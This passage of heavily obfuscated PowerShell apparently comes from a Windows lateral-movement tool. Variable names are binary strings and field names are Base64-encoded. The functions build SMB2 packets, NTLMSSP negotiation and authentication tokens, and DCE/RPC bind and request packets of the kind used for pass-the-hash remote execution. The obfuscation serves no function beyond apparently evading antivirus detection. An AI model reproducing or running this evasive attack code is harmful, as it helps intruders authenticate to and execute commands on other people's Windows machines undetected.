    ${10010110001101111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBmAGYAcwBlAHQA'))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    ${10010110001101111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBJAEQA'))),${_01011011101000101})
    ${10010110001101111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAbgBuAGUAbAA='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10010110001101111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AYQBpAG4AaQBuAGcAQgB5AHQAZQBzAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10010110001101111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAEMAaABhAG4AbgBlAGwASQBuAGYAbwBPAGYAZgBzAGUAdAA='))),[Byte[]](0x00,0x00))
    ${10010110001101111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAEMAaABhAG4AbgBlAGwASQBuAGYAbwBMAGUAbgBnAHQAaAA='))),[Byte[]](0x00,0x00))
    ${10010110001101111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    return ${10010110001101111}
}
function _01111110001110001
{
    param ([Byte[]]${_01011011101000101})
    ${00011110101111111} = New-Object System.Collections.Specialized.OrderedDictionary
    ${00011110101111111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAdQBjAHQAdQByAGUAUwBpAHoAZQA='))),[Byte[]](0x18,0x00))
    ${00011110101111111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA=='))),[Byte[]](0x00,0x00))
    ${00011110101111111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${00011110101111111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBJAEQA'))),${_01011011101000101})
    return ${00011110101111111}
}
function _10000111011000010
{
    ${11000000000000000} = New-Object System.Collections.Specialized.OrderedDictionary
    ${11000000000000000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAdQBjAHQAdQByAGUAUwBpAHoAZQA='))),[Byte[]](0x04,0x00))
    ${11000000000000000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00,0x00))
    return ${11000000000000000}
}
function _10110011111010001
{
    ${00111110100101101} = New-Object System.Collections.Specialized.OrderedDictionary
    ${00111110100101101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAdQBjAHQAdQByAGUAUwBpAHoAZQA='))),[Byte[]](0x04,0x00))
    ${00111110100101101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00,0x00))
    return ${00111110100101101}
}
function _10010000011010010
{
    param([Byte[]]${_01011010010111110},[Byte[]]${_10001011010000100},[Int]${_01100001010000011},[Int]${_10010101010110010})
    [Byte[]]${10100010111010110} = [System.BitConverter]::GetBytes(${_01100001010000011} + 24)
    [Byte[]]${00010000111100000} = [System.BitConverter]::GetBytes(${_10010101010110010})
    ${10001111100100010} = New-Object System.Collections.Specialized.OrderedDictionary
    ${10001111100100010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAdQBjAHQAdQByAGUAUwBpAHoAZQA='))),[Byte[]](0x39,0x00))
    ${10001111100100010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00,0x00))
    ${10001111100100010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgB1AG4AYwB0AGkAbwBuAA=='))),${_01011010010111110})
    ${10001111100100010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBVAEkARABIAGEAbgBkAGwAZQA='))),${_10001011010000100})
    ${10001111100100010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAEQAYQB0AGEAXwBPAGYAZgBzAGUAdAA='))),[Byte[]](0x78,0x00,0x00,0x00))
    ${10001111100100010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAEQAYQB0AGEAXwBMAGUAbgBnAHQAaAA='))),${10100010111010110})
    ${10001111100100010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgASQBvAGMAdABsAEkAbgBTAGkAegBlAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10001111100100010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQARABhAHQAYQBfAE8AZgBmAHMAZQB0AA=='))),[Byte[]](0x78,0x00,0x00,0x00))
    ${10001111100100010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQARABhAHQAYQBfAEwAZQBuAGcAdABoAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10001111100100010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgASQBvAGMAdABsAE8AdQB0AFMAaQB6AGUA'))),${00010000111100000})
    ${10001111100100010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA=='))),[Byte[]](0x01,0x00,0x00,0x00))
    ${10001111100100010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkADIA'))),[Byte[]](0x00,0x00,0x00,0x00))
    if(${00010000111100000} -eq 40)
    {
        ${10001111100100010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAEQAYQB0AGEAXwBDAGEAcABhAGIAaQBsAGkAdABpAGUAcwA='))),[Byte[]](0x7f,0x00,0x00,0x00))
        ${10001111100100010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAEQAYQB0AGEAXwBDAGwAaQBlAG4AdABHAFUASQBEAA=='))),[Byte[]](0xc7,0x11,0x73,0x1e,0xa5,0x7d,0x39,0x47,0xaf,0x92,0x2d,0x88,0xc0,0x44,0xb1,0x1e))
        ${10001111100100010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAEQAYQB0AGEAXwBTAGUAYwB1AHIAaQB0AHkATQBvAGQAZQA='))),[Byte[]](0x01))
        ${10001111100100010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAEQAYQB0AGEAXwBVAG4AawBuAG8AdwBuAA=='))),[Byte[]](0x00))
        ${10001111100100010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAEQAYQB0AGEAXwBEAGkAYQBsAGUAYwB0AEMAbwB1AG4AdAA='))),[Byte[]](0x02,0x00))
        ${10001111100100010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAEQAYQB0AGEAXwBEAGkAYQBsAGUAYwB0AA=='))),[Byte[]](0x02,0x02))
        ${10001111100100010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAEQAYQB0AGEAXwBEAGkAYQBsAGUAYwB0ADIA'))),[Byte[]](0x10,0x02))
    }
    return ${10001111100100010}
}
function _01101001100100110
{
    param([Byte[]]${_00111010011110001},[Byte[]]$Version)
    [Byte[]]${00001010011001111} = ([System.BitConverter]::GetBytes($Version.Length + 32))[0]
    [Byte[]]${00011010101110001} = ${00001010011001111}[0] + 32
    [Byte[]]${01011000111101010} = ${00001010011001111}[0] + 22
    [Byte[]]${00000110101110111} = ${00001010011001111}[0] + 20
    [Byte[]]${01100100001001001} = ${00001010011001111}[0] + 2
    ${00001110000100000} = New-Object System.Collections.Specialized.OrderedDictionary
    ${00001110000100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGkAdABpAGEAbABDAG8AbgB0AGUAeAB0AFQAbwBrAGUAbgBJAEQA'))),[Byte[]](0x60))
    ${00001110000100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGkAdABpAGEAbABjAG8AbgB0AGUAeAB0AFQAbwBrAGUAbgBMAGUAbgBnAHQAaAA='))),${00011010101110001})
    ${00001110000100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGkAcwBNAGUAYwBoAEkARAA='))),[Byte[]](0x06))
    ${00001110000100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGkAcwBNAGUAYwBoAEwAZQBuAGcAdABoAA=='))),[Byte[]](0x06))
    ${00001110000100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBJAEQA'))),[Byte[]](0x2b,0x06,0x01,0x05,0x05,0x02))
    ${00001110000100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAG4AZQByAEMAbwBuAHQAZQB4AHQAVABvAGsAZQBuAEkARAA='))),[Byte[]](0xa0))
    ${00001110000100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAG4AZQByAEMAbwBuAHQAZQB4AHQAVABvAGsAZQBuAEwAZQBuAGcAdABoAA=='))),${01011000111101010})
    ${00001110000100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAG4AZQByAEMAbwBuAHQAZQB4AHQAVABvAGsAZQBuAEkARAAyAA=='))),[Byte[]](0x30))
    ${00001110000100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAG4AZQByAEMAbwBuAHQAZQB4AHQAVABvAGsAZQBuAEwAZQBuAGcAdABoADIA'))),${00000110101110111})
    ${00001110000100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGMAaABUAHkAcABlAHMASQBEAA=='))),[Byte[]](0xa0))
    ${00001110000100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGMAaABUAHkAcABlAHMATABlAG4AZwB0AGgA'))),[Byte[]](0x0e))
    ${00001110000100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGMAaABUAHkAcABlAHMASQBEADIA'))),[Byte[]](0x30))
    ${00001110000100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGMAaABUAHkAcABlAHMATABlAG4AZwB0AGgAMgA='))),[Byte[]](0x0c))
    ${00001110000100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGMAaABUAHkAcABlAHMASQBEADMA'))),[Byte[]](0x06))
    ${00001110000100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGMAaABUAHkAcABlAHMATABlAG4AZwB0AGgAMwA='))),[Byte[]](0x0a))
    ${00001110000100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGMAaABUAHkAcABlAA=='))),[Byte[]](0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a))
    ${00001110000100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGMAaABUAG8AawBlAG4ASQBEAA=='))),[Byte[]](0xa2))
    ${00001110000100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGMAaABUAG8AawBlAG4ATABlAG4AZwB0AGgA'))),${01100100001001001})
    ${00001110000100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQBTAFMAUABJAEQA'))),[Byte[]](0x04))
    ${00001110000100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQBTAFMAUABMAGUAbgBnAHQAaAA='))),${00001010011001111})
    ${00001110000100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAZgBpAGUAcgA='))),[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
    ${00001110000100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAHMAcwBhAGcAZQBUAHkAcABlAA=='))),[Byte[]](0x01,0x00,0x00,0x00))
    ${00001110000100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAGcAbwB0AGkAYQB0AGUARgBsAGEAZwBzAA=='))),${_00111010011110001})
    ${00001110000100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwBXAG8AcgBrAHMAdABhAHQAaQBvAG4ARABvAG0AYQBpAG4A'))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    ${00001110000100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwBXAG8AcgBrAHMAdABhAHQAaQBvAG4ATgBhAG0AZQA='))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    if($Version)
    {
        ${00001110000100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))),$Version)
    }
    return ${00001110000100000}
}
function _01110111001111011
{
    param([Byte[]]${_10110001101001110})
    [Byte[]]${00001010011001111} = ([System.BitConverter]::GetBytes(${_10110001101001110}.Length))[1,0]
    [Byte[]]${00011010101110001} = ([System.BitConverter]::GetBytes(${_10110001101001110}.Length + 12))[1,0]
    [Byte[]]${01011000111101010} = ([System.BitConverter]::GetBytes(${_10110001101001110}.Length + 8))[1,0]
    [Byte[]]${00000110101110111} = ([System.BitConverter]::GetBytes(${_10110001101001110}.Length + 4))[1,0]
    ${00111011001101000} = New-Object System.Collections.Specialized.OrderedDictionary
    ${00111011001101000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBTAE4ASQBEAA=='))),[Byte[]](0xa1,0x82))
    ${00111011001101000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBTAE4ATABlAG4AZwB0AGgA'))),${00011010101110001})
    ${00111011001101000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBTAE4ASQBEADIA'))),[Byte[]](0x30,0x82))
    ${00111011001101000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBTAE4ATABlAG4AZwB0AGgAMgA='))),${01011000111101010})
    ${00111011001101000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBTAE4ASQBEADMA'))),[Byte[]](0xa2,0x82))
    ${00111011001101000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBTAE4ATABlAG4AZwB0AGgAMwA='))),${00000110101110111})
    ${00111011001101000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQBTAFMAUABJAEQA'))),[Byte[]](0x04,0x82))
    ${00111011001101000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQBTAFMAUABMAGUAbgBnAHQAaAA='))),${00001010011001111})
    ${00111011001101000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQBSAGUAcwBwAG8AbgBzAGUA'))),${_10110001101001110})
    return ${00111011001101000}
}
function _01100001010101100
{
    param([Byte[]]${_00111000111011101},[Int]${_01011100011110101},[Byte[]]${_01100111010111000},[Byte[]]${_00001010001001000},[Byte[]]${_00101101001101110},[Byte[]]${_10011010111101001})
    [Byte[]]${01111010001000010} = [System.BitConverter]::GetBytes(${_01011100011110101})
    ${11000010101000100} = New-Object System.Collections.Specialized.OrderedDictionary
    ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))),[Byte[]](0x05))
    ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgBNAGkAbgBvAHIA'))),[Byte[]](0x00))
    ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAGMAawBlAHQAVAB5AHAAZQA='))),[Byte[]](0x0b))
    ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAGMAawBlAHQARgBsAGEAZwBzAA=='))),[Byte[]](0x03))
    ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBSAGUAcAByAGUAcwBlAG4AdABhAHQAaQBvAG4A'))),[Byte[]](0x10,0x00,0x00,0x00))
    ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgByAGEAZwBMAGUAbgBnAHQAaAA='))),${_00111000111011101})
    ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABMAGUAbgBnAHQAaAA='))),[Byte[]](0x00,0x00))
    ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABJAEQA'))),${01111010001000010})
    ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAWABtAGkAdABGAHIAYQBnAA=='))),[Byte[]](0xb8,0x10))
    ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAUgBlAGMAdgBGAHIAYQBnAA=='))),[Byte[]](0xb8,0x10))
    ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBzAHMAbwBjAEcAcgBvAHUAcAA='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AQwB0AHgASQB0AGUAbQBzAA=='))),${_01100111010111000})
    ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgA='))),[Byte[]](0x00,0x00,0x00))
    ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAHgAdABJAEQA'))),${_00001010001001000})
    ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AVAByAGEAbgBzAEkAdABlAG0AcwA='))),[Byte[]](0x01))
    ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgAyAA=='))),[Byte[]](0x00))
    ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUA'))),${_00101101001101110})
    ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUAVgBlAHIA'))),${_10011010111101001})
    ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUAVgBlAHIATQBpAG4AbwByAA=='))),[Byte[]](0x00,0x00))
    ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGEAbgBzAGYAZQByAFMAeQBuAHQAYQB4AA=='))),[Byte[]](0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60))
    ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGEAbgBzAGYAZQByAFMAeQBuAHQAYQB4AFYAZQByAA=='))),[Byte[]](0x02,0x00,0x00,0x00))
    if(${_01100111010111000}[0] -eq 2)
    {
        ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAHgAdABJAEQAMgA='))),[Byte[]](0x01,0x00))
        ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AVAByAGEAbgBzAEkAdABlAG0AcwAyAA=='))),[Byte[]](0x01))
        ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgAzAA=='))),[Byte[]](0x00))
        ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUAMgA='))),${_00101101001101110})
        ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUAVgBlAHIAMgA='))),${_10011010111101001})
        ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUAVgBlAHIATQBpAG4AbwByADIA'))),[Byte[]](0x00,0x00))
        ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGEAbgBzAGYAZQByAFMAeQBuAHQAYQB4ADIA'))),[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGEAbgBzAGYAZQByAFMAeQBuAHQAYQB4AFYAZQByADIA'))),[Byte[]](0x01,0x00,0x00,0x00))
    }
    elseif(${_01100111010111000}[0] -eq 3)
    {
        ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAHgAdABJAEQAMgA='))),[Byte[]](0x01,0x00))
        ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AVAByAGEAbgBzAEkAdABlAG0AcwAyAA=='))),[Byte[]](0x01))
        ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgAzAA=='))),[Byte[]](0x00))
        ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUAMgA='))),${_00101101001101110})
        ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUAVgBlAHIAMgA='))),${_10011010111101001})
        ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUAVgBlAHIATQBpAG4AbwByADIA'))),[Byte[]](0x00,0x00))
        ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGEAbgBzAGYAZQByAFMAeQBuAHQAYQB4ADIA'))),[Byte[]](0x33,0x05,0x71,0x71,0xba,0xbe,0x37,0x49,0x83,0x19,0xb5,0xdb,0xef,0x9c,0xcc,0x36))
        ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGEAbgBzAGYAZQByAFMAeQBuAHQAYQB4AFYAZQByADIA'))),[Byte[]](0x01,0x00,0x00,0x00))
        ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAHgAdABJAEQAMwA='))),[Byte[]](0x02,0x00))
        ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AVAByAGEAbgBzAEkAdABlAG0AcwAzAA=='))),[Byte[]](0x01))
        ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgA0AA=='))),[Byte[]](0x00))
        ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUAMwA='))),${_00101101001101110})
        ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUAVgBlAHIAMwA='))),${_10011010111101001})
        ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUAVgBlAHIATQBpAG4AbwByADMA'))),[Byte[]](0x00,0x00))
        ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGEAbgBzAGYAZQByAFMAeQBuAHQAYQB4ADMA'))),[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGEAbgBzAGYAZQByAFMAeQBuAHQAYQB4AFYAZQByADMA'))),[Byte[]](0x01,0x00,0x00,0x00))
    }
    if(${01111010001000010} -eq 3)
    {
        ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABUAHkAcABlAA=='))),[Byte[]](0x0a))
        ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABMAGUAdgBlAGwA'))),[Byte[]](0x02))
        ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABQAGEAZABMAGUAbgBnAHQAaAA='))),[Byte[]](0x00))
        ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABSAGUAcwBlAHIAdgBlAGQA'))),[Byte[]](0x00))
        ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAHgAdABJAEQAMwA='))),[Byte[]](0x00,0x00,0x00,0x00))
        ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAZgBpAGUAcgA='))),[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
        ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAHMAcwBhAGcAZQBUAHkAcABlAA=='))),[Byte[]](0x01,0x00,0x00,0x00))
        ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAGcAbwB0AGkAYQB0AGUARgBsAGEAZwBzAA=='))),[Byte[]](0x97,0x82,0x08,0xe2))
        ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwBXAG8AcgBrAHMAdABhAHQAaQBvAG4ARABvAG0AYQBpAG4A'))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwBXAG8AcgBrAHMAdABhAHQAaQBvAG4ATgBhAG0AZQA='))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        ${11000010101000100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBTAFYAZQByAHMAaQBvAG4A'))),[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))
    }
    return ${11000010101000100}
}
function _10000100010100110
{
    param([Byte[]]${_00001100100101101},[Int]${_01110100111010000},[Int]${_00111001110010100},[Int]${_00011100111101110},[Byte[]]${_01011100011110101},[Byte[]]${_00001010001001000},[Byte[]]${_00100110010100110},[Byte[]]${_00101110101001101})
    if(${_00111001110010100} -gt 0)
    {
        ${10111001011010101} = ${_00111001110010100} + ${_00011100111101110} + 8
    }
    [Byte[]]${01111011000111101} = [System.BitConverter]::GetBytes(${_01110100111010000} + 24 + ${10111001011010101} + ${_00101110101001101}.Length)
    [Byte[]]${10001010001100010} = ${01111011000111101}[0,1]
    [Byte[]]${00000000000000111} = [System.BitConverter]::GetBytes(${_01110100111010000} + ${_00101110101001101}.Length)
    [Byte[]]${00100111010111110} = ([System.BitConverter]::GetBytes(${_00111001110010100}))[0,1]
    ${00100101110011000} = New-Object System.Collections.Specialized.OrderedDictionary
    ${00100101110011000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))),[Byte[]](0x05))
    ${00100101110011000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgBNAGkAbgBvAHIA'))),[Byte[]](0x00))
    ${00100101110011000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAGMAawBlAHQAVAB5AHAAZQA='))),[Byte[]](0x00))
    ${00100101110011000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAGMAawBlAHQARgBsAGEAZwBzAA=='))),${_00001100100101101})
    ${00100101110011000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBSAGUAcAByAGUAcwBlAG4AdABhAHQAaQBvAG4A'))),[Byte[]](0x10,0x00,0x00,0x00))
    ${00100101110011000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgByAGEAZwBMAGUAbgBnAHQAaAA='))),${10001010001100010})
    ${00100101110011000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABMAGUAbgBnAHQAaAA='))),${00100111010111110})
    ${00100101110011000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABJAEQA'))),${_01011100011110101})
